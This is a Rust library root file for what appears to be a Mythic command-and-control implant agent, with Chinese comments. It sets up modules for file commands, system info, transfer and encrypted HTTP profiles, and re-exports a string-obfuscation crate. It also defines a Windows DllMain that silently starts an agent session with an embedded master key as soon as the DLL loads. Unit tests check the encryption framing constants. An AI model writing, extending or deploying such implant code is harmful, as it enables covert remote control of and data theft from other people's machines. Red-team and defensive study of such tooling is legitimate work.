// #![no_std]

extern crate alloc;

pub mod buffer;
pub mod commands {
    pub mod file;
}
pub use commands::file;
pub mod config;
pub mod engine;
pub mod error;
pub mod protocol;
pub mod sysinfo;
pub mod transfer;

pub use obfstr;

pub mod profiles {
    pub mod crypto;
    pub mod http;
}

// =========================================================================
// 统一从核心内存与缓冲区子系统 (buffer.rs) 重导出，对外提供稳定统一的 Facade 门面
// =========================================================================
pub use crate::buffer::*;

// 向后兼容模块别名与多桶调度器重导出
pub use protocol as mythic_message_type;
pub use protocol::DynamicBudget;

// =========================================================================
// 动态链接库出口 (Windows DLL Entrypoint)
// =========================================================================
#[cfg(windows)]
#[unsafe(no_mangle)]
#[allow(non_snake_case)]
pub extern "system" fn DllMain(
    _hinst_dll: *mut core::ffi::c_void,
    fdw_reason: u32,
    _lpv_reserved: *mut core::ffi::c_void,
) -> i32 {
    const DLL_PROCESS_ATTACH: u32 = 1;
    if fdw_reason == DLL_PROCESS_ATTACH {
        std::thread::spawn(|| {
            let master_key = crate::config::AgentConfig::master_key();
            let payload_uuid = crate::config::AgentConfig::payload_uuid_bytes();
            if let Ok(mut session) = crate::engine::AgentSession::new(&master_key, &payload_uuid) {
                session.run();
            }
        });
    }
    1
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_facade_constants_and_derivations() {
        assert_eq!(UUID_LEN, 36);
        assert_eq!(IV_LEN, 16);
        assert_eq!(HMAC_LEN, 32);
        assert_eq!(AES_BLOCK_SIZE, 16);
        assert_eq!(PKCS7_WORST_PADDING, 16);
        assert_eq!(PROTOCOL_HEADER_LEN, 84);
        assert_eq!(MIN_ENCRYPTED_PAYLOAD_LEN, 64);
        assert_eq!(MIN_RAW_MESSAGE_LEN, 100);

        // 4K 衍生常量测试
        assert_eq!(WIRE_SIZE_4K, 4096);
        assert_eq!(RAW_LEN_4K, 3072);
        assert_eq!(CIPHERTEXT_LEN_4K, 2976);
        assert_eq!(PLAINTEXT_LEN_4K, 2960);
        assert_eq!(RAW_READ_4K, 2106);
        assert_eq!(RAW_READ_4K % 3, 0);

        // 16K 衍生常量测试
        assert_eq!(WIRE_SIZE_16K, 16384);
        assert_eq!(RAW_LEN_16K, 12288);
        assert_eq!(CIPHERTEXT_LEN_16K, 12192);
        assert_eq!(PLAINTEXT_LEN_16K, 12176);
        assert_eq!(RAW_READ_16K, 9018);
        assert_eq!(RAW_READ_16K % 3, 0);

        // 64K 衍生常量测试
        assert_eq!(WIRE_SIZE_64K, 65536);
        assert_eq!(RAW_LEN_64K, 49152);
        assert_eq!(CIPHERTEXT_LEN_64K, 49056);
        assert_eq!(PLAINTEXT_LEN_64K, 49040);
        assert_eq!(RAW_READ_64K, 36666);
        assert_eq!(RAW_READ_64K % 3, 0);

        // Active 常量联动测试
        assert_eq!(MAX_B64_LEN, ACTIVE_WIRE_SIZE);
        assert_eq!(MAX_RAW_LEN, calc_raw_len(ACTIVE_WIRE_SIZE));
        assert_eq!(MAX_PLAINTEXT_LEN, calc_max_plaintext_len(MAX_RAW_LEN));
        assert_eq!(MAX_RAW_READ, calc_max_raw_read(MAX_PLAINTEXT_LEN, DEFAULT_JSON_OVERHEAD));

        // BUFFER_SIZE 与各子模块重导出校验测试
        assert_eq!(BUFFER_SIZE, ACTIVE_WIRE_SIZE);
        assert_eq!(crate::protocol::BUFFER_SIZE, BUFFER_SIZE);
        assert_eq!(crate::profiles::crypto::BUFFER_SIZE, BUFFER_SIZE);
        assert_eq!(crate::buffer::BUFFER_SIZE, BUFFER_SIZE);

        // Padded length 计算测试
        assert_eq!(calc_padded_len(0), 16);
        assert_eq!(calc_padded_len(15), 16);
        assert_eq!(calc_padded_len(16), 32);
        assert_eq!(calc_raw_total(0), 84 + 16);
        assert_eq!(calc_raw_total(16), 84 + 32);
    }
}